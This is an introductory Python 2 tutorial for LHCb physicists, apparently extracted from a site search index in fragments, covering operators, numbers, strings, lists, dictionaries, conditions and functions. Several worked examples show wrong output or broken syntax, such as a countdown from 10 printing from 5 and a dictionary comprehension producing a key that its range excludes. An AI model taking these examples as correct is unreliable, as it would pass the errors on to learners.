It’s widely used used in the \nscientific community due to the broad selection of feature-rich, actively \nmaintained libraries. This means that a lot of software has already been \nwritten to solve problems common to our field, so you can concentrate on the \ninteresting stuff!\nIn LHCb, Python is used for lots of things, particularly for writing files that \nmake ntuples for you, but also for many analyses.\nUnless you are absolutely forced to use another language by external \nconstraints, such as your fit program already being written in C++, we \nrecommend using Python, even if you’re not comfortable with it right now. This \nis because there’s a large support group of other people who can help you with \nproblems you might have down the line, and because we believe it’s the best \ntool, all in all, for data analysis.\nAim of these lessons\nThere are already plenty of superb guides on the Internet for learning \nPython, all of which will be more comprehensive than this one. This particular \nguide exists because it closely follows what we teach at the \nStarterkit, where we teach Python over the course of one day, and \nso only teaches you what you need to follow along in the lessons that are \nspecific to high-energy physics.\nWe expect you to be familiar with at least one other programming language, so \nthat you understand sentences like \"we assign value 123 to variable abc\" and \n\"this is a function which accepts two arguments\". You should also understand \nthe basics of using a text editor, which you use to write code to a file \nsomewhere, and then you can somehow run the contents using commands in your \nterminal to make stuff happen.\nSounds good?

Either way, a simple way to get Python on your \ncomputer is to install Anaconda.\n Python 3?You might see material that talks about Python 3. Like a lot of other software, \nPython is regularly updated and groups batches of updates, including bug fixes \nand new features, into versions. The interesting thing about Python 3 is that \nit isn’t backwards compatible with Python 2. This means that code that works \nwhen run with version 2 of Python may not necessarily work when run with \nversion 3. Python 2 was around for a long time, and so the process of migrating to Python 3 has been slow, which is why so many people talk about it.\nIndeed, LHCb software is not compatible with Python 3, and so we use Python 2 \nin these lessons. In general, and out in the real world, Python 3 is preferred \nas it receives the most focus from the people who make Python. If you’re \nstarting a new project, and don’t have to use LHCb software, consider trying to \nuse Python 3. You can install both Python 2 and Python 3 using \nAnaconda.\n\nPython is a very user-friendly language.

This is just like bash, where you type your command, run \nit, see the results, and can then type the next line. Sometimes there are no \nresults, so you don’t see anything being printed (just like running the true \ncommand in bash).\nYou can leave the session by running exit(), or by using the Ctrl-d key \ncombination.\nEverything that can be done in Python can be done in an interactive session; \nit’s a great way to experiment.

The \nanswer is the dot operator ..\n>>> math.sin\n\n\nOperators are special pieces of the syntax of a programming language.\nSyntax is the way you express what you want to do.\nIn Python, an operator acts on the thing that’s on the right of it using the \nthing on the left. In the example we just saw, the dot operator . acts on \nmath in a way that, somehow, retrieves a method called math.sin. We can \nthen use that method straight away:\n>>> math.pi\n3.141592653589793\n>>> math.sin(math.pi)\n1.2246467991473532e-16\n\nHere we see there’s also a property of math called pi, which seems to \nhave the appropriate value.\nWe could also store the result of math.sin in a variable, and use it later.\n>>> twopi = 2*math.pi\n>>> my_sin = math.sin\n>>> my_sin(twopi)\n-2.4492935982947064e-16\n\nThere are several symbols that can be used as operators, like +, -, *, \nand /. Certain things support the use of certain operators. For example, \nnumbers support the plus operator:\n>>> 1 + 2\n3\n\nThe plus operator acts on 1 with 2, and, somehow, 1 knows how to deal \nwith 2, in this case by performing addition as we know it.\nWhen we do 1 + 2, what’s going on behind the scenes is exactly the same as \nwhen do math.sin. Observe!\n>>> (1).__add__\n\n>>> (1).__add__(2)\n3\n\nNumbers have a special __add__ method attached to them, in the same way \nthat math has a sin method attached. The plus operator + is just a \nshortcut for accessing this __add__ method. The double underscores either \nside of the name tell you that there’s something special about it; in this case \nit means that you can use the plus operator + instead.\n Methods for other operatorsThe other operators that you can use with numbers have corresponding methods. \nWhat other operator methods are available? Try some of them out, and see how \nthey compare with using the operator like normal.\n SolutionClick to expandWe’ve already met two ways that you can find out what things are attached to \nsomething. In IPython, you can try (1).__, or you can always use the \ndir method.\n>>> dir(1)\n['__abs__',\n '__add__',\n '__and__',\n '__bool__',\n ...\n 'to_bytes']\n\nThen it’s just a case of scanning through this list and seeing what names look \nright. The __sub__ name looks like ‘subtraction’, and similarly __mul__ and \n__truediv__ sound like multiplication and division.\n>>> (1).__mul__(5)\n5\n>>> (1).__truediv__(5)\n0.2\n\n\nOf course, there’s also a method for the dot operator! It’s called \n__getattribute__, and it takes the name of the thing you want to get.\n>>> (1).__add__\n\n>>> (1).__getattribute__('__add__')\n\n\nSo, of course, we can do this horrible one-liner:\n>>> (1).__getattribute__('__add__')(3)\n4\n\nYou would never do something like this in your day-to-day programming, but \nwe’ve done it here to illustrate how Python performs operations.\nObjects\nThe use of the dot operator is interesting because we’re manipulating the \nfundamental building block of Python: objects. Objects are containers of \nthings, and we can access those things by name using the dot operator.\nWe can sometimes use other operators as a shorthand for accessing \nspecially-named methods within objects, like using + for __add__.\nMost things in Python are objects! Numbers, like we’ve seen, are objects, \nbecause we can retrieve things from them with ..  Of course, the object \nitself is interesting because it can represent a value, like the number \n999.\nIt the next set of lessons, we’ll go through the different types of objects \nlike come with the Python language.\n"},"python/numbers.html":{"url":"python/numbers.html","title":"Numbers","keywords":"","body":"Numbers\nThere’s nothing magical about numbers in Python, and we’ve already discovered \nhow we perform operations on them.\n>>> (2*(1 + 3) - 5)/0.5\n2\n>>> 11 % 4\n3\n\nThe only thing to keep in mind is that Python has a few different types of \nnumbers, and they can behave differently.\n>>> 10/3\n3\n>>> 10.0/3.0\n3.3333333333333335\n\nInteresting. Something different happens when we use numbers with and without \ndecimal places! This occurs because numbers given with decimal places, like \n3.14  are floats, while those without, like 3, are integers.\nFor historical reasons, dividing two integers in Python 2 returns an integer, \nwhere the intermediate result is always rounded down. Division using at least \none float gives us the more intuitive answer.\nIn Python 3, division with integers works the same way as with floats. You can \nask to have this behaviour in Python 2.\n>>> from __future__ import division\n>>> 3/4\n0.75\n>>> 3.0/4.0\n0.75\n\nBecause the default behaviour in Python 2 is quite unintuitive, we recommend \nusing the from __future__ import division line everywhere. We’ll come to what exactly this \nline is doing shortly.\nIf you do want a rounding division, you then can ask for it explicitly with \nthe // operation:\n>>> 10/3\n3.3333333333333335\n\n>>> 10//3\n3\n\n OperatorsThis behaviour can be explained in terms of operators and the double-underscore \nmethods. You can see that numbers have two methods for division:\n>>> dir(1)\n[...,\n '__floordiv__',\n ...\n '__truediv__',\n ...]\n\nIn Python 2, the / operator corresponded to the __floordiv__ method when \nused with integers, but the __truediv__ operator when used with floats. In \nPython 3, and when using the from __future__ import division line, the / \noperator always uses the __truediv__ method.\n\nPython also lets you manipulate complex numbers, using j to represent the \ncomplex term.\n>>> a = 1 + 4j\n>>> b= 4 - 1j\n>>> a - b\n(-3+5j)\n\nComplex numbers are objects, of course, and have some useful functions and \nproperties attached to them.\n>>> a.conjugate()\n(1-4j)\n>>> a.imag\n4.0\n>>> a.real\n1.0\n\nSomewhat confusingly, computing the magnitude of a complex number can be done \nwith the abs method, which is available globally.\n>>> abs(a)\n4.123105625617661\n>>> import math\n>>> math.sqrt(a.real**2 + a.imag**2)\n4.123105625617661\n\nThis also demonstrates the ** operator, which for real numbers corresponds to \nexponentiation.\nEach type of number can be created literally, like we’ve been doing, by just \ntyping the number into your shell or source code, and by using the correspond \nmethods.\n>>> int()\n0\n>>> float()\n0.0\n>>> complex()\n0j\n\n"},"python/strings.html":{"url":"python/strings.html","title":"Strings","keywords":"","body":"Strings\nNumber objects are useful for storing values which are, well, numbers.

This is useful because we can copy-paste the \nstring into some Python code to use it somewhere else, without having to worry \nabout escaping things.\nWe can create multi-line strings by using three quotation marks. \nConventionally, double quotations are usually used for these.\n>>> long_fact = \"\"\"This is a long string.\n...\n... Quite long indeed.\n... \"\"\"\n>>> print long_fact\nThis is a long string.\n\nQuite long indeed.\n\n>>>\n\nCreating strings like this is useful when you want to include line breaks in \nyour string. You can also use \\n in strings to insert line breaks.\n>>> 'This is a long string\\n\\nQuite long indeed.\\n'\n\nWe can convert things to strings by using the str method, which can also \ncreate an empty string for us.\n>>> str()\n''\n>>> 'A number: ' + str(999 - 1)\n'A number: 998'\n\nStrings are objects, and have lots of useful methods attached to them. If you \nwant to know how many characters are in a string, you use the global len \nmethod.\n>>> b.upper()\n'A CARROT'\n>>> b.upper().lower()\n'a carrot'\n>>> b.replace('carrot', 'parrot').replace(' ', '_')\n'A_parrot'\n>>> len(b)\n8\n>>> b\n'A carrot'\n\nNotice that none of these operations modify the value of the b variable. \nOperations on strings always return new strings. Strings are said to be \nimmutable for this reason: you can never change a string, just make new ones.\nFormatting\nOne of the most common things you’ll find yourself doing with strings is \ninterleaving values into them. For example, you’ve finished an amazing \nanalysis, and want to print the results.\n>>> result1 = 123.0\n>>> result2 = 122.3\n>>> print 'My results are: ' + str(result1) + ', ' + str(result2)\nMy results are: 123.0, 122.3\n\nThis is already quite ugly, and will only get worse with more results. We can \ninstead use the format method that’s available on strings, and use the \nspecial {} placeholders to say where we want the values to go in the string.\n>>> template = 'My results are: {0}, {1}'\n>>> print template.format(result1, result2)\nMy results are: 123.0, 122.3\n\nMuch better! We define the whole string at once, and then place the missing \nvalues in later.\nThe numbers inside the placeholders, {0} and {1}, correspond to the indices \nof the arguments passed to the format method, where 0 is the first \nargument, 1 is the second, and so on. By referencing positions like this, we \ncan easily repeat placeholders in the string, but only pass the values once to \nformat.\n>>> template2 = 'My results are: {0}, {1}. But the best is {0}, obviously.'\n>>> print template2.format(result1, result2)\nMy results are: 123.0, 122.3. But the best is 123.0, obviously.\n\nYou can also use named placeholders, then passing the values to format \nusing the same name.\n>>> template3 = 'My results are: {best}, {worst}. But the best is {best}, obviously.'\n>>> print template3.format(best=result1, worst=result2)\nMy results are: 123.0, 122.3. But the best is 123.0, obviously.\n\nThis is nice because it gives more meaning to what the placeholders are for.\nThere’s a lot you can do inside the placeholders, such as specifying that you want to format a number with a certain number of decimal places.\n>>> print 'This number is great: {0:.3f}'.format(result1)\nThis number is great: 123.000\n\nIf you want to print a literal curly brace using format, you will need to\nescape it by doubling it, so that {{ will become { and }} will become }.\nHere's an example:\n>>> print 'This number will be surrounded by curly braces: {{{0}}}'.format(123)\nThis number will be surrounded by curly braces: {123}\n\nThe innermost {0} is replaced with the number, and {{...}} becomes {...}.\n"},"python/lists.html":{"url":"python/lists.html","title":"Lists and looping","keywords":"","body":"Lists and looping\nNow things start to get really interesting! Lists are collections of things \nstored in a specific order. They can be defined literally by wrapping things in \nsquare brackets [], separating items with commas ,.\n>>> a = [4, 2, 9, 3]\n>>> a\n[4, 2, 9, 3]\n\nPython lists can contain collections of whatever you like.\n>>> excellent = [41, 'Hello', math.sin]\nEach item in the list can be accessed by its index, its position in the list, \nwhich starts at zero for the first item. Indexing by negative numbers starts \nfrom the last item of the list.\n>>> a[0]\n4\n>>> a[2]\n9\n>>> a[-1]\n3\n\nWe’ll get an error if we try to access an index that doesn’t exist:\n>>> a[99]\nTraceback (most recent call last):\n  File \"\", line 1, in \nIndexError: list index out of range\n\nLike strings, lists have a length which can be found with the len method.\n>>> len(a)\n4\n\nUnlike strings, lists are mutable, which means we can modify lists in-place, \nwithout creating a new one.\n>>> a.append(45)\n>>> a\n[4, 2, 9, 3, 45]\n>>> len(a)\n5\n\nWe can see that lists are mutable because using the append method didn’t \nprint anything, and our variable a now has a different value.\nBecause lists are mutable, we can use the special del keyword to remove \nspecific indices from the list.\n>>> del a[-2]\n>>> a\n[4, 2, 9, 45]\n\n Functions and keywordsdel is a language keyword representing an action, and not a function. The\nsyntactic difference is that functions take their arguments between parentheses,\nsuch as my_function(1, 2, 3), whereas del does not.\n\nYou can retrieve sub-lists by using slice notation whilst indexing.\n>>> a[1:-1]\n[2, 9]\n\nThis retrieves the part of list a starting from index 1 until just before \nindex -1. The indexing is ‘exclusive’ in that it excludes the item of the \nlast index. This is the convention of indexing in Python.\nYou can omit a number in the first or second indexing position, and Python will \nassume you mean the first element (index zero) and last element (index \nlen(array)).\n>>> a[:-2]\n[4, 2\n>>> a[1:]\n[2, 9, 45]\n>>> a[:]\n[4, 2, 9, 45]\n\nSlicing returns a copy of the array, so modifying the return value doesn’t \naffect the original array.\n>>> b = a[1:]\n>>> b\n[2, 9, 45]\n>>> b[0] = 3\n>>> b\n[3, 9, 45]\n>>> a\n[4, 2, 9, 45]\n\nWe did something cool there by assigning a value to a specific index, b[0] =\n3. The same trick works with slices.\n>>> b[:2] = [99, 2, 78]\n>>> b\n[99, 2, 78, 45]\n\nThis is equivalent of replacing a certain range (:2, or items at position 0\nand 1) of the list b with other items from another list. Note that in our\nexample we replace 2 elements with 3. The same syntax might be used for\ninserting elements at an arbitrary position in the list. If we want to insert\nthe number 6 between the 2 and the 78 in the list above, we would use:\n>>> b[2:0] = [6]\n>>> b\n[99, 2, 6, 78, 45]\n\nmeaning take out 0 elements from the list starting a position 2 and insert the\ncontent of the list [6] in that position.\n Copying a listSlicing creates a copy, so what notation could you use to copy the full list?\n SolutionClick to expandYou need to slice from the very beginning to the very end of the list.\n>>> a[:]\n[4, 2, 9, 45]\n\nThis is equivalent to specifying the indices explicitly.\n>>> a[0:len(a)]\n[4, 2, 9, 45]\n\n\nLooping\nWhen you’ve got a collection of things, it’s pretty common to want to access \neach one sequentially. This is called looping, or iterating, and is super easy.\n>>> for item in a:\n...     print item\n...\n4\n2\n9\n45\n\nWe have to indent the code inside the for loop to tell Python that these\nlines should be run for every iteration.\n Indentation in PythonThe for loop is a block, and every Python block requires indentation, unlike\nother \"free-form\" languages such as C++ or Java. This means that Python will\nthrow an error if you don't indent:\n>>> for i in b:\n... print i\n  File \"\", line 2\n    print i\n        ^\nIndentationError: expected an indented block\n\nIndentation must be consistent within the same block, so if you indent two lines\nin the same for loop using a different number of spaces, Python will complain\nonce again:\n>>> for i in b:\n...   print \"I am in a loop\"\n...     print i\n  File \"\", line 3\n    print i\n    ^\nIndentationError: unexpected indent\n\nIndentation is necessary as Python does not use any keyword or symbol to\ndetermine the end of a block (e.g. there is no endfor). As a side effect,\nindentation forces you to make your code more readable!\nNote that it does not matter how many spaces you use for indentation. As a\nconvention, we are using four spaces.\n\nThe variable name item can be whatever we want, but its value is changed by \nPython to be the element of the item we’re currently on, starting from the \nfirst.\nBecause lists are mutable, we can try to modify the length of the list whilst \nwe’re iterating.\n>>> a_copy = a[:]\n>>> for item in a_copy:\n...     del a_copy[0]\n...\n>>> a_copy\n[9, 45]\n\nIntuitively, you might expect a_copy to be empty, but it’s not! The technical\nreasons aren’t important, but this highlights an important rule: never\nmodify the length of a list whilst iterating over it! You won’t end up with\nwhat you expect.\nYou can, however, freely modify the values of each item in the list whilst \nlooping. This is a very common use case.\n>>> a_copy = a[:]\n>>> i = 0\n>>> for item in a_copy:\n...     a_copy[i] = 2*item\n...     i += 1\n...\n>>> a_copy\n[8, 4, 18, 90]\n\nKeeping track of the current index ourselves, with i is annoying, but luckily \nPython gives us a nicer way of doing that.\n>>> a_doubled = a[:]\n>>> for index, item in enumerate(a_doubled):\n...     a_doubled[index] = 2*item\n...\n>>> a_doubled\n[8, 4, 18, 90]\n\nThere’s a lot going on here. Firstly, note that Python lets you assign values \nto multiple variables at the same time.\n>>> one, two = [34, 43]\n>>> print two, one\n43 34\n\nThat’s already pretty cool! But then think about what happens if you had a list \nwhere each item was another list, each containing two numbers.\n>>> nested = [[20, 29], [30, 34]]\n>>> for item in nested:\n...     print item\n...\n[20, 29]\n[30, 34]\n\nSo, we can just assign each item in the sublist to separate variables in the \nfor statement.\n>>> for one, two in nested:\n...     print two, one\n...\n29 20\n34 30\n\nNow we can understand a little better what enumerate does: for each item in \nthe list, it returns a new list containing the current index and the item.\n>>> enumerate(a)\n\n>>> list(enumerate(a))\n[(0, 4), (1, 2), (2, 9), (3, 45)]\n\nFor performance reasons enumerate doesn’t return a list directly, but instead\nsomething that the for statement knows how to iterate over (this is called a\ngenerator and for the moment you\ndon't need to know how it works). We can convert it to a list with the list\nmethod when we want to see what’s it doing.\nThis technique of looping over lists of lists lets us loop over two lists \nsimultaneously, using the zip method.\n>>> for item, item2 in zip(a, a_doubled):\n...     print item2, item\n...\n8 4\n4 2\n18 9\n90 45\n\nNeat! As before, we can see what zip is doing explicitly by using list.\n>>> list(zip(a, a_doubled))\n[(4, 8), (2, 4), (9, 18), (45, 90)]\n\nYou can see that the structure of the list that’s iterated over, the output of \nzip, is identical to that for enumerate.\nFinally, we’ll take a quick look at the range method.\n>>> range(0, 10)\n[0, 1, 2, 3, 4, 5, 6, 7, 8, 9]\n\nThe arguments to range work just like slicing, the second argument is treated \nexclusively, as its value is excluded from the output. Again like slicing, we \ncan specify a third argument as the step size for the iteration.\n>>> range(0, 10, 2)\n[0, 2, 4, 6, 8]\n\nIf you only give a single argument to range, it assumes you’ve given the end \nvalue, and want a starting value of zero.\n>>> range(5)\n[0, 1, 2, 3, 4]\n\nThis reads “give me a list of length 5, in steps of 1, starting from zero”.\nNow that we know how to easily generating sequences of numbers, we can write \nenumerate by hand!\n>>> for index, item in zip(range(len(a)), a):\n...     print index, item\n...\n0 4\n1 2\n2 9\n3 45\n\nJust like before! When you see something cool like enumerate, it can be fun \ntrying to see how you’d accomplish something similar with different building \nblocks.\nList comprehension\nWe’ve already made a new list from an existing one when we created a_doubled.\n>>> a_doubled = a[:]\n>>> for index, item in enumerate(a_doubled):\n...     a_doubled[index] = 2*item\n\nCreating a new list from an existing one is a common operation, so Python has a \nshorthand syntax called list comprehension.\n>>> a_doubled = [2*item for item in a]\n>>> a_doubled\n[8, 4, 18, 90]\n\nIsn’t that beautiful?\nWe can use the same multi-variable stuff we learnt whilst looping.\n>>> [index*item for index, item in enumerate(a)]\n[0, 2, 18, 135]\n\nWe’re not restricted to creating new lists with the same structure as the \noriginal.\n>>> [[item, item*item] for item in a]\n[[4, 16], [2, 4], [9, 81], [45, 2025]]\n\nWe can even filter out items from the original list using if.\n>>> [[item, item*item] for item in a if item % 2 == 0]\n[[4, 16], [2, 4]]\n\nList comprehensions are a powerful way of succinctly creating new lists. But be \nresponsible; if you find you’re doing something complicated, it’s probably \nbetter to write a full for loop.\nTuples\nA close relative of lists are tuples, which differ in that they cannot be \nmutated after creation.  You can create tuples literally using parentheses, or \nconvert things to tuples using the tuple method.\n>>> a = (3, 4)\n>>> del a[0]\nTraceback (most recent call last):\n  File \"\", line 1, in \nTypeError: 'tuple' object doesn't support item deletion\n>>> a.append(5)\nTraceback (most recent call last):\n  File \"\", line 1, in \nAttributeError: 'tuple' object has no attribute 'append'\n>>> a[0] = 1\nTraceback (most recent call last):\n  File \"\", line 1, in \nTypeError: 'tuple' object does not support item assignment\n>>> b = tuple([65, 'yes'])\n>>> b\n(65, 'yes')\n\nTuples are usually used to describe data whose length is meaningful in and of \nitself. For example, you could express coordinates as a tuple.\n>>> coords = (3.2, 0.1)\n>>> x, y = coords\n\nThis is nice because it doesn’t make sense to append to an (x,y)(x, y)(x,y) \ncoordinate, nor to ‘delete’ a dimension. Generally, it can be useful if the \ndata structure you’re using respects the meaning of the data you’re storing.\nIf you can’t think of a use for tuples yourself, its worth keeping in mind that \nPython using creates tuples for groups of things by default. We saw that \nearlier when we used enumerate.\n>>> list(enumerate([4, 9]))\n[(0, 4), (1, 9)]\n\nEach element of the list is a tuple.\n Write a list comprehension yourselfCompute the square of the magnitude of the sum of the following two \nthree-vectors, using a single list comprehension and the global sum method.\n>>> kaon = [3.4, 4.3, 20.0]\n>>> pion = [1.4, 0.9, 19.8]\n\nIt might help to first think about how you’d compute the quantity for a single \nvector.\n SolutionClick to expandNot sure what the sum method does? Ask for help!\n>>> help(sum)\n\nThe square magnitude is the sum of the squares of the components, where the \ncomponents are the sum of the two input vectors.\n>>> magsq = sum([(k + pi)**2 for k, pi in zip(kaon, pion)])\n\nThe square root of this is around 40.42.\n\n"},"python/dictionaries.html":{"url":"python/dictionaries.html","title":"Dictionaries","keywords":"","body":"Dictionaries\nYou can think of lists as a mapping from indices to values. The indices are\nalways integers and go from 0 to len(the_list), and the values are the\nitems.\nDictionaries are collections, just like lists, but they have important\ndifferences:\n\nlists map sequential numeric indices to items, whereas dictionaries can map\nmost object types to any object,\nlists are ordered collections of items, whereas dictionaries have no\nordering.\n\nSince anything can be used as index for an item, indices must be always\nspecified when creating a dictionary:\n>>> d = {1: 0.5, 'excellent index': math.sin, 0.1: 2}\n>>> d[1]\n0.5\n>>> d['excellent index']\n\n>>> d[0.1] = 3\n\nThe \"indicies\" of a dictionary are called keys, and the things they map to\nare values. Together, each key-value pair is an item.\n>>> d.keys()\n[1, 0.1, 'excellent index']\n>>> d.values()\n[0.5, 2, ]\n>>> d\n{0.1: 2, 1: 0.5, 'excellent index': }\n\nAs you can see, the values of a dictionary can be whatever we like, and need not\nbe the same type of object.\nYou can see that the order of the keys, values and items we get back are not the\nsame as the order we created the dictionary with. If you run the same example on\nyour own you might get a different ordering. This is what we mean when we define\ndictionaries as unordered collections: when you iterate over its content, you\ncannot rely on the ordering.\nIt is however guaranteed that the n-th item returned by keys() corresponds\nto the n-th item returned by values(). This allows the following example\nto work flawlessly:\n>>> for key, value in zip(d.keys(), d.values()):\n...     print key, ':', value\n...\n1 : 0.5\n0.1 : 3\nexcellent index : \n\nOf course, this could be considerably simpler just by using items(), which\ngives us tuples of key-value pairs.\n>>> for key, value in d.items():\n...     print key, ':', value\n...\n1 : 0.5\n0.1 : 3\nexcellent index : \n\nWe can create dictionaries from lists of 2-item lists.\n>>> dict(enumerate(['a thing', 'another']))\n{0: 'a thing', 1: 'another'}\n\nAnd also with dictionary comprehensions, in a similar manner to list\ncomprehensions, with the additional specification of the key.\n>>> {i: i**i for i in range(5) if i != 3}\n{0: 1, 1: 1, 2: 4, 4: 256, 5: 3125}\n\nNote that dictionary comprehensions require at least Python 2.7 to work.\nDictionary keys\nThere’s no restriction on values a dictionary might hold, but there is on keys.\n>>> l = [1, 4, 3]\n>>> dd = {}\n>>> dd[l] = 0\nTraceback (most recent call last):\n  File \"\", line 1, in \nTypeError: unhashable type: 'list'\n\nIn essence, keys must not be mutable. This includes numbers, strings, and\ntuples, but not lists.

When you\nlook up an item in a Python dictionary with my_dict[\"my_key\"], what happens\ninternally is:\n\nhash of \"my_key\" is calculated,\nthis number is compared to every hash of every key in the dictionary, until a\nmatch between the hashes is found,\nif two hashes match, and the two objects are really identical, the\ncorresponding dictionary item is returned.\n\nLooking up numbers instead of strings or tuples is considerably faster, but\nsince two different strings can have the same hash, their content has to be\ncompared as well to really tell whether they are equal. If two hashes are\ndifferent on the other hand we are sure that the objects are different as well.\n\nIteration over dictionaries is over their keys.\n>>> for key in d:\n...     print key, ':' d[key]\n...\n1 : 0.5\n0.1 : 3\nexcellent index : \n\nWe have already seen how to iterate over values (using d.values()) or keys\nand values simultaneously (using d.items()).\n On the efficiency of items()In Python 2, using items copies the keys and values of a dictionary, and gives\nyou back those copies. This can be problematic for large dictionaries as the\namount of memory your program uses can double. Python 3 uses a much more\nmemory-efficient way of implementing items so that you don't have to worry.\nIf you're having memory problems with using items in Python 2, you can use\nviewitems() instead, which behaves the same way as items does in Python 3.\nNote that there are also similar methods for keys and values, called\nviewkeys() and viewvalues(), and that all of these view methods are only\navailable from\nPython 2.7.\n\n Alphabet mappingMap each letter of the alphabet to a number with a dictionary comprehension,\nstarting with 0 for a and ending with 25 for z.\nYou can get a string containing the letters of the alphabet like this:\n>>> import string\n>>> string.ascii_lowercase\n'abcdefghijklmnopqrstuvwxyz'\n\nYou can iterate over a string exactly like a list.\n>>> for character in string.ascii_lowercase:\n...     print character\n...\na\nb\n...\nz\n\nThen, create the \"reverse\" dictionary, again with a comprehension, mapping\nletters to numbers.\n SolutionClick to expandYou need to have a list containing one number per letter, and to loop over that\nlist along with the characters in the string. This is exactly the same as\nlooping over items in a list alongside the index, so we can use enumerate.\n>>> alphabet_map = {i: c for i, c in enumerate(string.ascii_lowercase)}\n\nWe can create the inverse map by swapping the key and value in the\ncomprehension.\n>>> reverse_map = {c: i for i, c in alphabet_map.items()}\n\n\n"},"python/conditions.html":{"url":"python/conditions.html","title":"Conditions","keywords":"","body":"Conditions\nSometimes, often while looping, you only want to do things depending on\nsomething’s value.

This reads more naturally.\nAll Python objects are truth-like unless the have the value False, the value\nNone, or are empty collections (such as \"\", [], (), {}).\n>>> if list() or dict() or tuple() or str():\n...     print \"You won’t see me!\"\n\nThe value None, which is available as the variable named None, is often\nused as placeholder for an empty value.\n>>> favourite = None\n>>> for p in pizzas:\n...     if 'Olives' in p:\n...         favourite = p\n...\n>>> if favourite:\n...     print 'Found favourite: {0}'.format(favourite)\n... else:\n...     print 'No favourite :('\nNo favourite :(\n\nIt behaves as false-y value in conditions.\nConditions in loops\nfor loops and comprehensions are the most common ways of iterating in Python.\nWe’ve already seen that using conditions in these can be useful.\n>>> not_cheesy = [p for p in pizzas if 'cheese' not in p.lower()]\n>>> not_cheesy\n['Pineapple', 'Pepperoni', 'Hot dog']\n\nAnother way of iterating is with while.\n>>> i = 10\n>>> while i > 0:\n...     print 'T-minus {0} seconds'.format(i)\n...     # Equivalent to `i = i - 1`\n...     i -= 1\n... print 'Blast off!'\nT-minus 5 seconds\nT-minus 4 seconds\nT-minus 3 seconds\nT-minus 2 seconds\nT-minus 1 seconds\nBlast off!\n\nThe while loop checks the condition, runs the block, and then re-checks the\ncondition. If we don’t do something in the loop to change the result of the\ncondition, we will end up looping forever!\n>>> i = 5\n>>> while i > 0:\n...     print 'All work and no play makes Jack a dull boy'\n\nBecause we do not change the value of i in the loop, the condition always\nevaluates to True, so we’re stuck. You can stop Python running the code by\ntyping the Ctrl-c key combination.\nSometimes you want to stop iterating when some condition is met. You could\nachieve this with a while loop.\n>>> ok = False\n>>> i = 0\n>>> while not ok:\n...     ok =  'cheese' in pizza[i].lower()\n...     # Equivalent to `i = i + 1`\n...     i += 1\n...\n>>> i\n2\n>>> pizza[i - 1]\n'Cheese'\n\nIt is not nice to have to keep track of these ok and i variables. Instead,\nwe can use a for loop, which feels much more natural when iterating over a\ncollection, and break to stop looping.\n>>> for pizza in pizzas:\n...     if 'cheese' in pizza.lower():\n...         yum = pizza\n...         break\n...\n>>> yum\n'Cheese'\n\n"},"python/methods.html":{"url":"python/methods.html","title":"Methods","keywords":"","body":"Methods\nMethods, also called functions, take some input and return some output. We have\nalready used lots of methods, like dir, help, and len, and in this lesson\nwe will start creating are own.\nAs we have seen, methods can do a lot of stuff with very little typing. Methods\nare normally used to encapsulate small pieces of code that we want to reuse.\nLet’s rewrite len as an example.\n>>> def length(obj):\n...     \"\"\"Return the number of elements in obj.\n...\n...     obj must be iterable.\n...     \"\"\"\n...     i = 0\n...     for _ in obj:\n...         i += 1\n...     return i\n>>> length\n\n>>> help(length)\nHelp on function foo in module __main__:\n\nfoo(x)\n    Return the number of elements in obj.\n\n>>> length('A b c!')\n6\n>>> length(range(5))\n5\n\nThere’s a lot going on here, so we will break it down line-by-line.\n\ndef length(obj): methods are defined using def, followed by a space,\nand then the name you want to give the method.1 Inside the parentheses\nafter the name, we list the inputs, or arguments, that we want our method\nto accept.  In this case, we only need a single input: the thing we want to\ncompute the length of.  Finally, there’s a colon at the end, just like with\na for or if, which means a block of code follows (which must be\nindented).\n\"\"\"Return the number of elements in obj.\"\"\": This is the docstring. It’s\njust a string, defined literally with three double quotes so that we can\ninclude linebreaks. By placing a string here, Python makes the string\navailable to use when we pass our function to help. Documenting your\nfunctions is a very good idea! It makes it clear to others, and to\nfuture-you, what the method is supposed to do.\nThe method block. This is the code that will run whenever you call your\nmethod, like length([1]). The code in the block has access to the\narguments and to any variables defined before the method definition.>>> x = 1\n>>> def top_function():\n...    \"\"\"Do something silly.\"\"\"\n...    print x\n...    print y\n...\n>>> y = 2\n>>> top_function()\n1\nTraceback (most recent call last):\nFile \"\", line 1, in \nFile \"\", line 3, in top_function\nNameError: global name 'y' is not defined\n\nIn general, you should try to minimise the number of variables outside your\nmethod that you use inside. It makes figuring out what the method does much\nharder, as you have to look elsewhere in the code to find things out.\nreturn i: This defines the output of the method, the thing that you get\nback when you call the method. You don’t have to return anything, in which\ncase Python will implicitly make your function return None, or you can\nreturn multiple things at once.>>> def no_return():\n...     1 + 1\n...\n>>> no_return()\n>>> no_return() == None\n>>> def such_output():\n...     return 'wow', 'much clever', 213\n...\n>>> such_output()\n('wow', 'much clever', 213)\n>>> a, b, c = such_output()\n>>> b\n'much clever'\n\nYou can see that returning multiple things implicitly means returning a\ntuple, so we can choose to assign one variable per value while calling the\nmethod.\n\n\n1. Names are conventionally in lowercase, with underscores separating words. ↩\n\nMethods can be called in several ways.\n>>> def add(x, y):\n...    \"\"\"Return the sum of x and y.\"\"\"\n...    return x + y\n...\n>>> add(1, 2)\n>>> add(x=1, y=2)\n>>> add(1, y=2)\n>>> add(y=2, x=1)\n>>> add(y=2, 1)\n>>> add(y=2, 1)\n  File \"\", line 1\n    add(y=2, =1)\n             ^\nSyntaxError: invalid syntax\n\nSpecifying the argument’s name explicitly when calling a method is nice because\nit reminds you what the argument is supposed to do. It also means you don’t\nhave to remember the order in which the arguments were defined, you can specify\nkeyword arguments in any order. You can even mix positional arguments with\nkeyword arguments, but any keyword arguments must come last.\nUsing keyword arguments is particularly useful for arguments which act as\non/off flags, because it’s often not obvious what your True or False is\ndoing.\n>>> def add(x, y, show):\n...    \"\"\"Return the sum of x and y.\n...\n...    Optionally print the result before returning it.\n...    \"\"\"\n...    if show:\n...        print x + y\n...    return x + y\n...\n>>> _ = add(1, 2, True) # Hmm, what is True doing again?\n3\n>>> _ = add(1, 2, show=True) # Aha! Much clearer\n\nAlways having to specify that flag is annoying. It would be much nicer if\nshow had a default value, so that we don’t have to provide a value when\ncalling the method, but can optionally override it.\n>>> def add(x, y, show=False):\n...    \"\"\"Return the sum of x and y.\n...\n...

